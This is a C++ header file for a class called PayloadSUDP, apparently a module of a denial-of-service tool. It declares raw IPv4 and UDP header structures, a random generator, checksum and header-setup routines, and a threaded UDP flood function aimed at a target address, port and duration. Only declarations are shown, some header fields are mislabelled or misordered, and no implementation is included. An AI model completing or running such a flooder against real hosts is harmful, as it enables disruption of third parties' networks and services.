#pragma once
#pragma comment(lib, "Ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "../Core/CommonIncludes.h"
#include "CPayload.h"
using namespace std;

class PayloadSUDP
{
private:
	uint32_t Q[4096];
	uint32_t c = 362436;
	struct thread_data {
		int throttle;
		int thread_id;
		unsigned int floodport;
		struct sockaddr_in sin;
	};
	typedef struct iphdr
	{
		unsigned char ihl : 4; // 4-bit header length (in 32-bit words)
		// normally=5 (Means 20 Bytes may be 24 also)
		unsigned char version : 4;   // 4-bit IPv4 version
		unsigned char tos;          // IP type of service
		unsigned short tot_len; // Total length
		unsigned short id;          // Unique identifier

		unsigned char frag_off : 5; // Fragment offset field

		unsigned char ip_more_fragment : 1;
		unsigned char ip_dont_fragment : 1;
		unsigned char ip_reserved_zero : 1;

		unsigned char ip_frag_offset1; //fragment offset

		unsigned char ttl;          // Time to live
		unsigned char protocol;     // Protocol(TCP,UDP etc)
		unsigned short check;    // IP checksum
		unsigned int saddr;       // Source address
		unsigned int daddr;      // Source address
	} IPV4_HDR, *PIPV4_HDR, FAR * LPIPV4_HDR;
	/*
	struct iphdr {
		int ihl;
		int version;
		int tos;
		int tot_len;
		int id;
		int frag_off;
		int ttl;
		int protocol;
		int check;
		long saddr;
		u_long daddr;
	};*/

	struct udphdr {
		u_short source;
		int check;
		int len;
		u_short dest;
	};
	void init_rand(uint32_t x);
	uint32_t rand_cmwc(void);
	char *myStrCat(char *s, char *a);
	char *replStr(const char *str, size_t count);
	unsigned short csum(unsigned short *buf, int nwords);
	void setup_ip_header(iphdr *iph);
	void setup_udp_header(udphdr *udph);
	void flood(void *par1);

	int threads;
	int port;
	long address;
	int lTime;

	std::string name;
public:
	PayloadSUDP(const std::string & pName, const std::string & pAddress, int pPort, int pThreads, int pTime) : name(pName), address(inet_addr(pAddress.c_str())), port(pPort), threads(pThreads), lTime(pTime) {}


	void init();

};

